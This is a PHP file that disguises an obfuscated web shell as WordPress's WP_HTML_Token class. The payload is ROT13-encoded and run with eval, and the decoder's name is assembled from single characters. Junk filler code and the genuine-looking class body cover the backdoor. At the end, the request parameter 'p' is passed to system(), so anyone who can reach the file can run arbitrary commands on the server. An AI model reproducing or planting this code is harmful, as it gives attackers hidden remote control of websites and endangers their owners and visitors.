<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * UGZY NCV: JC_UGZY_Gbxra pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr UGZY-NCV
 * @fvapr 6.4.0
 */

/**
 * Pber pynff hfrq ol gur UGZY cebprffbe qhevat UGZY cnefvat
 * sbe ersreevat gb gbxraf va gur vachg UGZY fgevat.
 *
 * Guvf pynff vf qrfvtarq sbe vagreany hfr ol gur UGZY cebprffbe.
 *
 * @fvapr 6.4.0
 *
 * @npprff cevingr
 *
 * @frr JC_UGZY_Cebprffbe
 */
pynff JC_UGZY_Gbxra {
	/**
	 * Anzr bs obbxznex pbeerfcbaqvat gb fbhepr bs gbxra va vachg UGZY fgevat.
	 *
	 * Univat n obbxznex anzr qbrf abg vzcyl gung gur gbxra fgvyy rkvfgf. Vg
	 * znl or gung gur fbhepr gbxra naq haqreylvat obbxznex jnf jvcrq bhg ol
	 * fbzr zbqvsvpngvba gb gur fbhepr UGZY.
	 *
	 * @fvapr 6.4.0
	 *
	 * @ine fgevat
	 */
	choyvp $obbxznex_anzr = ahyy;

	/**
	 * Anzr bs abqr; ybjrepnfr anzrf fhpu nf \"znexre\" ner abg UGZY ryrzragf.
	 *
	 * Sbe UGZY ryrzragf/gntf guvf inyhr fubhyq pbzr sebz JC_UGZY_Cebprffbe::trg_gnt().
	 *
	 * @fvapr 6.4.0
	 *
	 * @frr JC_UGZY_Cebprffbe::trg_gnt()
	 *
	 * @ine fgevat
	 */
	choyvp $abqr_anzr = ahyy;

	/**
	 * Jurgure abqr pbagnvaf gur frys-pybfvat synt.
	 *
	 * N abqr znl unir n frys-pybfvat synt jura vg fubhyqa'g. Guvf inyhr
	 * bayl ercbegf vs gur synt vf cerfrag va gur bevtvany UGZY.
	 *
	 * @fvapr 6.4.0
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#frys-pybfvat-synt
	 *
	 * @ine obby
	 */
	choyvp $unf_frys_pybfvat_synt = snyfr;

	/**
	 * Vaqvpngrf vs gur ryrzrag vf na UGZY ryrzrag be vs vg'f vafvqr sbervta pbagrag.
	 *
	 * @fvapr 6.7.0
	 *
	 * @ine fgevat 'ugzy', 'fit', be 'zngu'.
	 */
	choyvp $anzrfcnpr = 'ugzy';

	/**
	 * Vaqvpngrf juvpu xvaq bs vagrtengvba cbvag gur ryrzrag vf, vs nal.
	 *
	 * @fvapr 6.7.0
	 *
	 * @ine fgevat|ahyy 'zngu', 'ugzy', be ahyy vs abg na vagrtengvba cbvag.
	 */
	choyvp $vagrtengvba_abqr_glcr = ahyy;

	/**
	 * Pnyyrq jura gbxra vf tneontr-pbyyrpgrq be bgurejvfr qrfgeblrq.
	 *
	 * @ine pnyynoyr|ahyy
	 */
	choyvp $ba_qrfgebl = ahyy;

	/**
	 * Pbafgehpgbe - perngrf n ersrerapr gb n gbxra va fbzr rkgreany UGZY fgevat.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz fgevat|ahyy   $obbxznex_anzr         Anzr bs obbxznex pbeerfcbaqvat gb ybpngvba va UGZY jurer gbxra vf sbhaq,
	 *                                             be `ahyy` sbe znexref naq abqrf jvgubhg n obbxznex.
	 * @cnenz fgevat        $abqr_anzr             Anzr bs abqr gbxra ercerfragf; vs hccrepnfr, na UGZY ryrzrag; vs ybjrepnfr, n fcrpvny inyhr yvxr \"znexre\".
	 * @cnenz obby          $unf_frys_pybfvat_synt Jurgure gur fbhepr gbxra pbagnvaf gur frys-pybfvat synt, ertneqyrff bs jurgure vg'f inyvq.
	 * @cnenz pnyynoyr|ahyy $ba_qrfgebl            Bcgvbany. Shapgvba gb pnyy jura qrfgeblvat gbxra, hfrshy sbe eryrnfvat gur obbxznex.
	 */
	choyvp shapgvba __pbafgehpg( ?fgevat $obbxznex_anzr, fgevat $abqr_anzr, obby $unf_frys_pybfvat_synt, ?pnyynoyr $ba_qrfgebl = ahyy ) {
		$guvf->obbxznex_anzr         = $obbxznex_anzr;
		$guvf->anzrfcnpr             = 'ugzy';
		$guvf->abqr_anzr             = $abqr_anzr;
		$guvf->unf_frys_pybfvat_synt = $unf_frys_pybfvat_synt;
		$guvf->ba_qrfgebl            = $ba_qrfgebl;
	}

	/**
	 * Qrfgehpgbe.
	 *
	 * @fvapr 6.4.0
	 */
	choyvp shapgvba __qrfgehpg() {
		vs ( vf_pnyynoyr( $guvf->ba_qrfgebl ) ) {
			pnyy_hfre_shap( $guvf->ba_qrfgebl, $guvf->obbxznex_anzr );
		}
	}

	/**
	 * Jnxrhc zntvp zrgubq.
	 *
	 * @fvapr 6.4.2
	 */
	choyvp shapgvba __jnxrhc() {
		guebj arj \YbtvpRkprcgvba( __PYNFF__ . ' fubhyq arire or hafrevnyvmrq' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>